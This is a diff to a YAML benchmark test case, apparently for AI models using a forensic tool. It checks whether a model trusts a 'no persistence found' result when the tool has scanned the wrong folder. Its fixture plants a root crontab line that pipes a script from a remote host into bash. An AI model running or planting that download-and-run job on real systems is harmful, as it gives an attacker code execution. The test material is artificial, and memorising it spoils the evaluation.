@@ -9,16 +9,513 @@ variant: findevil-d1a8d25
 commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
 display: response
 level: mcp
-realism: common
-realism_ko: "모델이 `fs/` 대신 사건 폴더를 루트로 넘기는 실수는 흔하다."
+realism: possible
+realism_ko: "수집본 폴더를 그대로 넘기는 일은 생긴다. 다만 모델은 대개 먼저 폴더를 열어 보고 `fs/`를 넘겨, 결함에 닿는 일은 드물다."
 coverage: full
 summary: When root_path is the case folder instead of its fs/ subfolder, so no etc/ or other scanned directory exists under it, find_persistence answers "No persistence mechanisms found under ..." without saying nothing was scanned, while the fs/ root below holds a cron job that downloads and runs a script.
 summary_ko: "`root_path`를 `fs/` 하위 폴더가 아니라 사건 폴더로 주면 그 아래에 `etc/` 같은 검사 대상이 없다. `find_persistence`는 아무것도 검사하지 않았다는 말 없이 \"No persistence mechanisms found under ...\"라고 답하는데, 그 아래 `fs/`에는 스크립트를 내려받아 실행하는 cron 작업이 있다."
 defect_ko: "검사할 폴더가 하나도 없어도 이 서버는 지속성이 없다고 답한다. 그렇다고 알려야 한다. 모델은 한 단계 아래에 있는 악성 cron 작업이 없다고 잘못 안다."
-setup_ko: "`case/fs/etc/crontab`에 내려받아 실행하는 작업을 두었다."
+setup_ko: "수집본 폴더(`case/`) 안에 파일 시스템 사본(`fs/`)과 수집 메모·해시 목록을 두고, Debian 기본 cron 작업과 서비스 파일 사이 `/etc/crontab`에 내려받아 실행하는 줄 하나를 넣었다."
 fixture:
+  # A triage collection laid out as analysts receive it: the file system copy
+  # under case/fs/ next to notes and hashes. The download-and-run cron line sits
+  # among the stock Debian cron jobs and unit files.
   - path: case/fs/etc/crontab
-    text: "* * * * * root curl -s http://203.0.113.7/x.sh | bash\n"
+    text: "# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }\n*/5 *\t* * *\troot\tcurl -s http://203.0.113.7/x.sh | bash\n#\n"
+  - path: case/fs/etc/cron.d/e2scrub_all
+    text: '30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+
+      10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+
+      '
+  - path: case/fs/etc/cron.d/php
+    text: '09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
+
+      '
+  - path: case/fs/etc/cron.d/sysstat
+    text: '5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
+
+      59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
+
+      '
+  - path: case/fs/etc/cron.daily/logrotate
+    text: '#!/bin/sh
+
+      if [ -d /run/systemd/system ]; then exit 0; fi
+
+      /usr/sbin/logrotate /etc/logrotate.conf
+
+      '
+  - path: case/fs/etc/systemd/system/multi-user.target.wants/nginx.service
+    text: '[Unit]
+
+      Description=A high performance web server and a reverse proxy server
+
+      After=network.target
+
+
+      [Service]
+
+      Type=forking
+
+      ExecStart=/usr/sbin/nginx -g ''daemon on; master_process on;''
+
+
+      [Install]
+
+      WantedBy=multi-user.target
+
+      '
+  - path: case/fs/etc/systemd/system/multi-user.target.wants/ssh.service
+    text: '[Unit]
+
+      Description=OpenBSD Secure Shell server
+
+
+      [Service]
+
+      ExecStart=/usr/sbin/sshd -D
+
+
+      [Install]
+
+      WantedBy=multi-user.target
+
+      '
+  - path: case/fs/home/deploy/.bashrc
+    text: '# ~/.bashrc
+
+      case $- in *i*) ;; *) return;; esac
+
+      HISTCONTROL=ignoreboth
+
+      alias ll=''ls -alF''
+
+      '
+  - path: case/fs/home/deploy/.bash_history
+    text: 'cd /srv/app
+
+      git pull
+
+      sudo systemctl restart nginx
+
+      exit
+
+      '
+  - path: case/fs/var/log/syslog
+    text: 'Apr 20 10:00:01 web01 CRON[3000]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 11:07:01 web01 CRON[3001]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 12:14:01 web01 CRON[3002]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 13:21:01 web01 CRON[3003]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 14:28:01 web01 CRON[3004]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 15:35:01 web01 CRON[3005]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 16:42:01 web01 CRON[3006]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 17:49:01 web01 CRON[3007]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 18:56:01 web01 CRON[3008]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 19:03:01 web01 CRON[3009]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 10:10:01 web01 CRON[3010]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 11:17:01 web01 CRON[3011]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 12:24:01 web01 CRON[3012]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 13:31:01 web01 CRON[3013]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 14:38:01 web01 CRON[3014]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 15:45:01 web01 CRON[3015]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 16:52:01 web01 CRON[3016]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 17:59:01 web01 CRON[3017]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 18:06:01 web01 CRON[3018]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 19:13:01 web01 CRON[3019]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 10:20:01 web01 CRON[3020]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 11:27:01 web01 CRON[3021]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 12:34:01 web01 CRON[3022]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 13:41:01 web01 CRON[3023]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 14:48:01 web01 CRON[3024]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 15:55:01 web01 CRON[3025]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 16:02:01 web01 CRON[3026]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 17:09:01 web01 CRON[3027]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 18:16:01 web01 CRON[3028]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 19:23:01 web01 CRON[3029]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 10:30:01 web01 CRON[3030]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 11:37:01 web01 CRON[3031]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 12:44:01 web01 CRON[3032]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 13:51:01 web01 CRON[3033]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 14:58:01 web01 CRON[3034]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 15:05:01 web01 CRON[3035]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 16:12:01 web01 CRON[3036]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 17:19:01 web01 CRON[3037]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 18:26:01 web01 CRON[3038]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 19:33:01 web01 CRON[3039]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 10:40:01 web01 CRON[3040]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 11:47:01 web01 CRON[3041]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 12:54:01 web01 CRON[3042]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 13:01:01 web01 CRON[3043]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 14:08:01 web01 CRON[3044]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 15:15:01 web01 CRON[3045]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 16:22:01 web01 CRON[3046]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 17:29:01 web01 CRON[3047]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 18:36:01 web01 CRON[3048]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 19:43:01 web01 CRON[3049]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 10:50:01 web01 CRON[3050]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 11:57:01 web01 CRON[3051]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 12:04:01 web01 CRON[3052]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 13:11:01 web01 CRON[3053]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 14:18:01 web01 CRON[3054]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 15:25:01 web01 CRON[3055]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 16:32:01 web01 CRON[3056]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 17:39:01 web01 CRON[3057]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 18:46:01 web01 CRON[3058]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 19:53:01 web01 CRON[3059]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 10:00:01 web01 CRON[3060]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 11:07:01 web01 CRON[3061]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 12:14:01 web01 CRON[3062]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 13:21:01 web01 CRON[3063]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 14:28:01 web01 CRON[3064]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 15:35:01 web01 CRON[3065]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 16:42:01 web01 CRON[3066]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 17:49:01 web01 CRON[3067]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 18:56:01 web01 CRON[3068]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 19:03:01 web01 CRON[3069]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 10:10:01 web01 CRON[3070]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 11:17:01 web01 CRON[3071]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 12:24:01 web01 CRON[3072]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 13:31:01 web01 CRON[3073]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 14:38:01 web01 CRON[3074]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 15:45:01 web01 CRON[3075]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 16:52:01 web01 CRON[3076]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 17:59:01 web01 CRON[3077]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 18:06:01 web01 CRON[3078]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 19:13:01 web01 CRON[3079]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 10:20:01 web01 CRON[3080]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 11:27:01 web01 CRON[3081]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 12:34:01 web01 CRON[3082]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 13:41:01 web01 CRON[3083]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 14:48:01 web01 CRON[3084]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 15:55:01 web01 CRON[3085]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 16:02:01 web01 CRON[3086]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 17:09:01 web01 CRON[3087]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 18:16:01 web01 CRON[3088]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 19:23:01 web01 CRON[3089]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 10:30:01 web01 CRON[3090]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 11:37:01 web01 CRON[3091]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 12:44:01 web01 CRON[3092]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 13:51:01 web01 CRON[3093]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 14:58:01 web01 CRON[3094]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 15:05:01 web01 CRON[3095]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 16:12:01 web01 CRON[3096]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 17:19:01 web01 CRON[3097]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 18:26:01 web01 CRON[3098]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 19:33:01 web01 CRON[3099]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 10:40:01 web01 CRON[3100]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 11:47:01 web01 CRON[3101]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 12:54:01 web01 CRON[3102]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 13:01:01 web01 CRON[3103]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 14:08:01 web01 CRON[3104]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 15:15:01 web01 CRON[3105]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 16:22:01 web01 CRON[3106]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 17:29:01 web01 CRON[3107]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 18:36:01 web01 CRON[3108]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 19:43:01 web01 CRON[3109]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 10:50:01 web01 CRON[3110]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 11:57:01 web01 CRON[3111]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 12:04:01 web01 CRON[3112]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 13:11:01 web01 CRON[3113]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 14:18:01 web01 CRON[3114]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 15:25:01 web01 CRON[3115]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 16:32:01 web01 CRON[3116]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 17:39:01 web01 CRON[3117]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 18:46:01 web01 CRON[3118]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 19:53:01 web01 CRON[3119]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 10:00:01 web01 CRON[3120]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 11:07:01 web01 CRON[3121]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 12:14:01 web01 CRON[3122]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 13:21:01 web01 CRON[3123]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 14:28:01 web01 CRON[3124]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 15:35:01 web01 CRON[3125]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 16:42:01 web01 CRON[3126]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 17:49:01 web01 CRON[3127]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 18:56:01 web01 CRON[3128]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 19:03:01 web01 CRON[3129]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 10:10:01 web01 CRON[3130]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 11:17:01 web01 CRON[3131]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 12:24:01 web01 CRON[3132]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 13:31:01 web01 CRON[3133]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 14:38:01 web01 CRON[3134]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 15:45:01 web01 CRON[3135]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 16:52:01 web01 CRON[3136]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 17:59:01 web01 CRON[3137]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 18:06:01 web01 CRON[3138]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 19:13:01 web01 CRON[3139]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 10:20:01 web01 CRON[3140]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 11:27:01 web01 CRON[3141]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 12:34:01 web01 CRON[3142]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 13:41:01 web01 CRON[3143]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 14:48:01 web01 CRON[3144]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 15:55:01 web01 CRON[3145]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 16:02:01 web01 CRON[3146]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 17:09:01 web01 CRON[3147]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 18:16:01 web01 CRON[3148]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 19:23:01 web01 CRON[3149]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 10:30:01 web01 CRON[3150]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 11:37:01 web01 CRON[3151]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 12:44:01 web01 CRON[3152]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 13:51:01 web01 CRON[3153]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 14:58:01 web01 CRON[3154]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 15:05:01 web01 CRON[3155]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 16:12:01 web01 CRON[3156]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 17:19:01 web01 CRON[3157]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 18:26:01 web01 CRON[3158]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 19:33:01 web01 CRON[3159]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 10:40:01 web01 CRON[3160]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 11:47:01 web01 CRON[3161]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 12:54:01 web01 CRON[3162]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 13:01:01 web01 CRON[3163]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 14:08:01 web01 CRON[3164]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 15:15:01 web01 CRON[3165]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 16:22:01 web01 CRON[3166]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 17:29:01 web01 CRON[3167]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 18:36:01 web01 CRON[3168]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 19:43:01 web01 CRON[3169]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 10:50:01 web01 CRON[3170]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 11:57:01 web01 CRON[3171]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 12:04:01 web01 CRON[3172]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 13:11:01 web01 CRON[3173]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 14:18:01 web01 CRON[3174]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 15:25:01 web01 CRON[3175]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 16:32:01 web01 CRON[3176]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 17:39:01 web01 CRON[3177]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 18:46:01 web01 CRON[3178]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 19:53:01 web01 CRON[3179]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 10:00:01 web01 CRON[3180]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 11:07:01 web01 CRON[3181]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 12:14:01 web01 CRON[3182]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 13:21:01 web01 CRON[3183]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 14:28:01 web01 CRON[3184]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 15:35:01 web01 CRON[3185]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 16:42:01 web01 CRON[3186]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 17:49:01 web01 CRON[3187]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 18:56:01 web01 CRON[3188]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 19:03:01 web01 CRON[3189]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 10:10:01 web01 CRON[3190]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 22 11:17:01 web01 CRON[3191]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 23 12:24:01 web01 CRON[3192]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 24 13:31:01 web01 CRON[3193]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 25 14:38:01 web01 CRON[3194]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 26 15:45:01 web01 CRON[3195]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 27 16:52:01 web01 CRON[3196]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 28 17:59:01 web01 CRON[3197]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 20 18:06:01 web01 CRON[3198]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      Apr 21 19:13:01 web01 CRON[3199]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+
+      '
+  - path: case/collection_notes.txt
+    text: 'Triage collection of web01 (Debian 12), 2026-04-28.
+
+      fs/       file system copy (etc, home, var/log)
+
+      hashes.txt  SHA-256 of collected files
+
+      '
+  - path: case/hashes.txt
+    text: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  fs/etc/crontab
+
+      '
 steps:
   - tool: find_persistence
     note_ko: "결함 호출: 사건 폴더를 루트로 검사"
@@ -39,3 +536,20 @@ expect:
   - step: 2
     note_ko: "한 단계 아래를 검사하면 crontab 작업을 찾는다"
     contains: "etc/crontab"
+
+model:
+  # Realistic question: the analyst points at the collection folder, as handed over.
+  question: >-
+    This is a triage collection of a Debian web server under ${EVIDENCE}/case.
+    Check it for persistence mechanisms an attacker may have left. Answer Yes
+    or No, and name each mechanism with its file.
+  question_ko: "${EVIDENCE}/case 아래는 Debian 웹 서버에서 모은 분류 수집본이다. 공격자가 남긴 지속성 수단이 있는지 확인해 달라. Yes나 No로 답하고, 수단마다 파일을 말해 달라."
+  # The defect shows only when find_persistence gets the collection folder
+  # (no etc/ directly under it) and answers that nothing was found.
+  defect_tools: [find_persistence]
+  defect_response: "No persistence mechanisms found under"
+  repeat: 3
+  misled_if: all
+  expect:
+    - not_regex: "(?i)203\\.0\\.113\\.7|x\\.sh|curl[^\\n]{0,80}\\|\\s*(ba)?sh"
+      note_ko: "내려받아 실행하는 cron 작업을 말하지 않는다"
